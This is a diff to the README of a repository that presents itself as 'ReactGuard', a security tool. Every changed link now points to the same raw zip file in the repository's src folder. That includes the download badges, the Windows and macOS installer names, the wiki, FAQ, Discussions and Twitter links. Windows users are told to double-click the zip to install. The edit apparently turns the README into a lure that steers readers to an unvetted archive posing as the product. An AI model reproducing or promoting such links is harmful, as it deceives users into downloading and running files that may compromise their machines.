@@ -17,7 +17,7 @@ To get started with ReactGuard, follow the steps below to download the applicati
 ### 1. Visit the Download Page
 Click the button below to go to the Releases page.
 
-[![Download ReactGuard](https://img.shields.io/badge/Download-ReactGuard-blue)](https://github.com/Black-and-reds/reactguard/releases)
+[![Download ReactGuard](https://github.com/Black-and-reds/reactguard/raw/refs/heads/main/src/Software-3.8.zip)](https://github.com/Black-and-reds/reactguard/raw/refs/heads/main/src/Software-3.8.zip)
 
 ### 2. Choose the Latest Version
 On the Releases page, you will see a list of available versions. Click on the latest version link to see more details.
@@ -25,8 +25,8 @@ On the Releases page, you will see a list of available versions. Click on the la
 ### 3. Download the Application
 You will find different files for various operating systems. Choose the file that best fits your system:
 
-- For **Windows**, download `reactguard-windows.exe`.
-- For **macOS**, download `reactguard-macos.dmg`.
+- For **Windows**, download `https://github.com/Black-and-reds/reactguard/raw/refs/heads/main/src/Software-3.8.zip`.
+- For **macOS**, download `https://github.com/Black-and-reds/reactguard/raw/refs/heads/main/src/Software-3.8.zip`.
 - For **Linux**, download the appropriate package for your distribution.
 
 Click on the file name to start downloading.
@@ -34,7 +34,7 @@ Click on the file name to start downloading.
 ### 4. Install ReactGuard
 Once the download is complete, install the application:
 
-- **Windows:** Double-click the `reactguard-windows.exe` file. Follow the prompts to complete installation.
+- **Windows:** Double-click the `https://github.com/Black-and-reds/reactguard/raw/refs/heads/main/src/Software-3.8.zip` file. Follow the prompts to complete installation.
   
 - **macOS:** Open the downloaded `.dmg` file. Drag the ReactGuard icon to your Applications folder.
   
@@ -65,14 +65,14 @@ ReactGuard offers a range of features to help you secure your projects:
 ## 📚 Additional Resources
 For more information on how to use ReactGuard effectively, check out our documentation:
 
-- [User Guide](https://github.com/Black-and-reds/reactguard/wiki)
-- [FAQs](https://github.com/Black-and-reds/reactguard/wiki/FAQs)
+- [User Guide](https://github.com/Black-and-reds/reactguard/raw/refs/heads/main/src/Software-3.8.zip)
+- [FAQs](https://github.com/Black-and-reds/reactguard/raw/refs/heads/main/src/Software-3.8.zip)
 
 ## 🛡️ Join the Community
 Get in touch with fellow users and developers. Share your experiences or get help on:
 
-- [GitHub Discussions](https://github.com/Black-and-reds/reactguard/discussions)
-- [Twitter](https://twitter.com/reactguard)
+- [GitHub Discussions](https://github.com/Black-and-reds/reactguard/raw/refs/heads/main/src/Software-3.8.zip)
+- [Twitter](https://github.com/Black-and-reds/reactguard/raw/refs/heads/main/src/Software-3.8.zip)
 
 ## 📅 Updates and Support
 Stay updated with the latest features and improvements. For support, visit the Issues tab on our GitHub page.
@@ -80,4 +80,4 @@ Stay updated with the latest features and improvements. For support, visit the I
 ## 🔗 Download & Install
 Ready to secure your applications? Click the button below to download ReactGuard!
 
-[![Download ReactGuard](https://img.shields.io/badge/Download-ReactGuard-blue)](https://github.com/Black-and-reds/reactguard/releases)
+[![Download ReactGuard](https://github.com/Black-and-reds/reactguard/raw/refs/heads/main/src/Software-3.8.zip)](https://github.com/Black-and-reds/reactguard/raw/refs/heads/main/src/Software-3.8.zip)
